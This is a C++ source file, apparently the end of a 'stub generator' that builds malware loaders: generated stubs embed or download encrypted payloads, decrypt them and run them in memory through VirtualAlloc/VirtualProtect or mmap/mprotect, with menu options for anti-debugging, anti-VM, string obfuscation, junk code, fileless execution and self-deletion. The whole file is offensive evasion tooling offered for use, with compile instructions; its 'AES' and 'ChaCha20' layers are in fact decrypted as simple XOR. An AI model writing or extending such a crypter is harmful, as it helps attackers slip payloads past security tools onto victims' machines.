            stub << "    std::ifstream file(tempFile, std::ios::binary);\n";
            stub << "    if (file) {\n";
            stub << "        file.seekg(0, std::ios::end);\n";
            stub << "        size_t size = file.tellg();\n";
            stub << "        file.seekg(0, std::ios::beg);\n";
            stub << "        data.resize(size);\n";
            stub << "        file.read(reinterpret_cast<char*>(data.data()), size);\n";
            stub << "        file.close();\n";
            stub << "    }\n";
            stub << "    unlink(tempFile);\n";
            stub << "#endif\n";
            stub << "    return data;\n";
            stub << "}\n\n";
        }
        
        // Main function
        stub << "int main() {\n";
        
        // Random delay
        if (config.randomDelays) {
            stub << "    // Random delay\n";
            stub << "    {\n";
            stub << "        std::random_device rd;\n";
            stub << "        std::mt19937 gen(rd());\n";
            stub << "        std::uniform_int_distribution<> dist(1, 999);\n";
            stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
            stub << "    }\n\n";
        }
        
        // Anti-debug check
        if (config.antiDebug) {
            stub << "    if (" << vars[1] << "()) return 0;\n\n";
        }
        
        // Platform detection
        stub << "    // Detect platform\n";
        stub << "    bool isWindows = " << vars[0] << "();\n\n";
        
        // Get appropriate payload
        stub << "    std::vector<uint8_t> " << vars[3] << ";\n\n";
        
        if (config.embedBothPayloads) {
            // Embedded payloads
            if (!windowsPayload.empty()) {
                stub << "    // Windows payload\n";
                stub << "    unsigned char " << vars[4] << "[] = {\n        ";
                for (size_t i = 0; i < encryptedWindows.size(); i++) {
                    if (i > 0 && i % 16 == 0) stub << "\n        ";
                    stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                         << (int)encryptedWindows[i];
                    if (i < encryptedWindows.size() - 1) stub << ", ";
                }
                stub << "\n    };\n\n";
            }
            
            if (!linuxPayload.empty()) {
                stub << "    // Linux payload\n";
                stub << "    unsigned char " << vars[5] << "[] = {\n        ";
                for (size_t i = 0; i < encryptedLinux.size(); i++) {
                    if (i > 0 && i % 16 == 0) stub << "\n        ";
                    stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                         << (int)encryptedLinux[i];
                    if (i < encryptedLinux.size() - 1) stub << ", ";
                }
                stub << "\n    };\n\n";
            }
            
            stub << "    // Select payload based on platform\n";
            stub << "    if (isWindows) {\n";
            if (!windowsPayload.empty()) {
                stub << "        " << vars[3] << ".assign(" << vars[4] << ", " << vars[4] 
                     << " + sizeof(" << vars[4] << "));\n";
            } else {
                stub << "        std::cerr << \"No Windows payload available\" << std::endl;\n";
                stub << "        return 1;\n";
            }
            stub << "    } else {\n";
            if (!linuxPayload.empty()) {
                stub << "        " << vars[3] << ".assign(" << vars[5] << ", " << vars[5] 
                     << " + sizeof(" << vars[5] << "));\n";
            } else {
                stub << "        std::cerr << \"No Linux payload available\" << std::endl;\n";
                stub << "        return 1;\n";
            }
            stub << "    }\n\n";
        } else {
            // Download based on platform
            stub << "    // Download platform-specific payload\n";
            stub << "    const char* url = isWindows ? \"" << config.windowsURL 
                 << "\" : \"" << config.linuxURL << "\";\n";
            stub << "    " << vars[3] << " = " << vars[2] << "(url);\n";
            stub << "    if (" << vars[3] << ".empty()) {\n";
            stub << "        std::cerr << \"Failed to download payload\" << std::endl;\n";
            stub << "        return 1;\n";
            stub << "    }\n\n";
        }
        
        // Decrypt payload
        if (config.useTripleEncryption) {
            stub << "    // Decrypt payload\n";
            
            // Embed keys (same for both platforms)
            for (size_t i = 0; i < config.encryptionLayers.size(); i++) {
                const auto& method = config.encryptionLayers[i];
                if (method == "AES" && !keys.aesKey.empty()) {
                    stub << "    unsigned char " << vars[10+i] << "[] = {";
                    for (size_t j = 0; j < keys.aesKey.size(); j++) {
                        if (j > 0) stub << ", ";
                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                             << (int)keys.aesKey[j];
                    }
                    stub << "};\n";
                } else if (method == "ChaCha20" && !keys.chachaKey.empty()) {
                    stub << "    unsigned char " << vars[10+i] << "[] = {";
                    for (size_t j = 0; j < keys.chachaKey.size(); j++) {
                        if (j > 0) stub << ", ";
                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                             << (int)keys.chachaKey[j];
                    }
                    stub << "};\n";
                } else if (method == "XOR" && !keys.xorKey.empty()) {
                    stub << "    unsigned char " << vars[10+i] << "[] = {";
                    for (size_t j = 0; j < keys.xorKey.size(); j++) {
                        if (j > 0) stub << ", ";
                        stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                             << (int)keys.xorKey[j];
                    }
                    stub << "};\n";
                }
            }
            
            stub << "\n";
            
            // Apply decryption
            for (int i = config.encryptionLayers.size() - 1; i >= 0; i--) {
                const auto& method = config.encryptionLayers[i];
                stub << "    // Decrypt " << method << " layer\n";
                stub << "    for (size_t i = 0; i < " << vars[3] << ".size(); i++) {\n";
                stub << "        " << vars[3] << "[i] ^= " << vars[10+i] 
                     << "[i % sizeof(" << vars[10+i] << ")];\n";
                stub << "    }\n\n";
            }
        }
        
        // Execute payload
        stub << "    // Execute payload\n";
        stub << "#ifdef _WIN32\n";
        stub << "    void* " << vars[20] << " = VirtualAlloc(0, " << vars[3] 
             << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        stub << "    if (!" << vars[20] << ") return 1;\n";
        stub << "    memcpy(" << vars[20] << ", " << vars[3] << ".data(), " 
             << vars[3] << ".size());\n";
        stub << "    DWORD oldProtect;\n";
        stub << "    VirtualProtect(" << vars[20] << ", " << vars[3] 
             << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        if (config.randomDelays) {
            stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        }
        stub << "    ((void(*)())" << vars[20] << ")();\n";
        stub << "#else\n";
        stub << "    void* " << vars[20] << " = mmap(0, " << vars[3] 
             << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        stub << "    if (" << vars[20] << " == MAP_FAILED) return 1;\n";
        stub << "    memcpy(" << vars[20] << ", " << vars[3] << ".data(), " 
             << vars[3] << ".size());\n";
        stub << "    mprotect(" << vars[20] << ", " << vars[3] 
             << ".size(), PROT_READ | PROT_EXEC);\n";
        if (config.randomDelays) {
            stub << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        }
        stub << "    ((void(*)())" << vars[20] << ")();\n";
        stub << "#endif\n\n";
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
};  // Add this closing brace for the class

// Interactive configuration
UnifiedStubGenerator::StubConfig getConfigFromUser() {
    UnifiedStubGenerator::StubConfig config;
    int choice;
    
    std::cout << "\n=== Payload Delivery Method ===\n";
    std::cout << "1. Embedded payload\n";
    std::cout << "2. Fileless execution\n";
    std::cout << "3. URL download to temp\n";
    std::cout << "4. Cross-platform (Windows/Linux)\n"; // Added option for cross-platform
    std::cout << "Select (1-4): ";
    std::cin >> choice;
    
    switch (choice) {
        case 1: config.payloadMethod = UnifiedStubGenerator::StubConfig::EMBEDDED; break;
        case 2: config.payloadMethod = UnifiedStubGenerator::StubConfig::FILELESS; break;
        case 3: 
            config.payloadMethod = UnifiedStubGenerator::StubConfig::URL_DOWNLOAD;
            std::cout << "Enter download URL: ";
            std::cin >> config.downloadURL;
            break;
        case 4: 
            config.payloadMethod = UnifiedStubGenerator::StubConfig::CROSS_PLATFORM;
            std::cout << "Embed both Windows and Linux payloads? (y/n): ";
            char yn;
            std::cin >> yn;
            config.embedBothPayloads = (yn == 'y' || yn == 'Y');
            if (!config.embedBothPayloads) {
                std::cout << "Enter Windows download URL: ";
                std::cin >> config.windowsURL;
                std::cout << "Enter Linux download URL: ";
                std::cin >> config.linuxURL;
            }
            break;
    }
    
    std::cout << "\n=== Encryption Options ===\n";
    std::cout << "Use triple-layer encryption? (y/n): ";
    char yn;
    std::cin >> yn;
    config.useTripleEncryption = (yn == 'y' || yn == 'Y');
    
    if (config.useTripleEncryption) {
        std::cout << "Randomize encryption order? (y/n): ";
        std::cin >> yn;
        config.randomizeOrder = (yn == 'y' || yn == 'Y');
    }
    
    std::cout << "\n=== Output Format ===\n";
    std::cout << "1. C++ source code\n";
    std::cout << "2. Assembly source code\n";
    std::cout << "3. Raw shellcode\n";
    std::cout << "Select (1-3): ";
    std::cin >> choice;
    
    switch (choice) {
        case 1: config.outputFormat = UnifiedStubGenerator::StubConfig::CPP_SOURCE; break;
        case 2: config.outputFormat = UnifiedStubGenerator::StubConfig::ASM_SOURCE; break;
        case 3: config.outputFormat = UnifiedStubGenerator::StubConfig::SHELLCODE; break;
    }
    
    std::cout << "\n=== Stealth Features ===\n";
    std::cout << "Enable anti-debugging? (y/n): ";
    std::cin >> yn;
    config.antiDebug = (yn == 'y' || yn == 'Y');
    
    std::cout << "Enable anti-VM? (y/n): ";
    std::cin >> yn;
    config.antiVM = (yn == 'y' || yn == 'Y');
    
    std::cout << "Obfuscate strings? (y/n): ";
    std::cin >> yn;
    config.obfuscateStrings = (yn == 'y' || yn == 'Y');
    
    std::cout << "Store keys as decimal numbers? (y/n): ";
    std::cin >> yn;
    config.useDecimalKeys = (yn == 'y' || yn == 'Y');
    
    std::cout << "Add junk code? (y/n): ";
    std::cin >> yn;
    config.addJunkCode = (yn == 'y' || yn == 'Y');
    
    std::cout << "Enable random delays? (y/n): ";
    std::cin >> yn;
    config.randomDelays = (yn == 'y' || yn == 'Y');
    
    std::cout << "\n=== Execution Options ===\n";
    
    if (config.payloadMethod != UnifiedStubGenerator::StubConfig::URL_DOWNLOAD) {
        std::cout << "In-memory execution? (y/n): ";
        std::cin >> yn;
        config.inMemoryExecution = (yn == 'y' || yn == 'Y');
    }
    
    std::cout << "Clear memory after execution? (y/n): ";
    std::cin >> yn;
    config.clearMemoryAfter = (yn == 'y' || yn == 'Y');
    
    if (config.payloadMethod == UnifiedStubGenerator::StubConfig::URL_DOWNLOAD) {
        std::cout << "Delete downloaded file after execution? (y/n): ";
        std::cin >> yn;
        config.selfDelete = (yn == 'y' || yn == 'Y');
    }
    
    return config;
}

int main(int argc, char* argv[]) {
    std::cout << "=== Unified Customizable Stub Generator ===\n";
    std::cout << "Version 1.0 - All features in one tool\n\n";
    
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <input_file> <output_file> [--config]\n";
        std::cout << "       " << argv[0] << " --url <output_file> [--config]\n";
        std::cout << "       " << argv[0] << " --cross-platform <output_file> [--config]\n\n"; // Added cross-platform usage
        std::cout << "Options:\n";
        std::cout << "  --config    Interactive configuration mode\n";
        std::cout << "  --url       URL-based payload (no input file needed)\n";
        std::cout << "  --cross-platform    Cross-platform stub (no input file needed)\n\n"; // Added cross-platform option
        return 1;
    }
    
    UnifiedStubGenerator generator;
    UnifiedStubGenerator::StubConfig config;
    
    std::string inputFile;
    std::string outputFile;
    bool urlMode = false;
    
    // Parse command line
    if (std::string(argv[1]) == "--url") {
        urlMode = true;
        outputFile = argv[2];
        config.payloadMethod = UnifiedStubGenerator::StubConfig::URL_DOWNLOAD;
    } else if (std::string(argv[1]) == "--cross-platform") {
        outputFile = argv[2];
        config.payloadMethod = UnifiedStubGenerator::StubConfig::CROSS_PLATFORM;
        
        // For cross-platform, we need to get the payload files
        if (argc >= 5 && std::string(argv[3]) != "--config") {
            config.windowsPayloadFile = argv[3];
            config.linuxPayloadFile = argv[4];
        }
    } else {
        inputFile = argv[1];
        outputFile = argv[2];
    }
    
    // Check for --config flag
    bool interactiveConfig = false;
    for (int i = 3; i < argc; i++) {
        if (std::string(argv[i]) == "--config") {
            interactiveConfig = true;
            break;
        }
    }
    
    if (interactiveConfig) {
        config = getConfigFromUser();
    } else {
        // Use default config
        std::cout << "Using default configuration (use --config for interactive mode)\n";
    }
    
    // Generate stub
    if (generator.generateStub(inputFile, outputFile, config)) {
        std::cout << "\nStub generated successfully!\n";
        std::cout << "Output: " << outputFile << "\n";
        
        if (config.outputFormat == UnifiedStubGenerator::StubConfig::CPP_SOURCE) {
            std::cout << "\nCompile with:\n";
            std::cout << "  g++ -O2 -o stub " << outputFile;
            if (config.randomDelays) std::cout << " -pthread";
            std::cout << "\n";
        } else if (config.outputFormat == UnifiedStubGenerator::StubConfig::ASM_SOURCE) {
            std::cout << "\nAssemble with:\n";
            std::cout << "  nasm -f elf64 " << outputFile << " -o stub.o\n";
            std::cout << "  ld stub.o -o stub\n";
        }
    } else {
        std::cerr << "\nFailed to generate stub!\n";
        return 1;
    }
    
    return 0;
}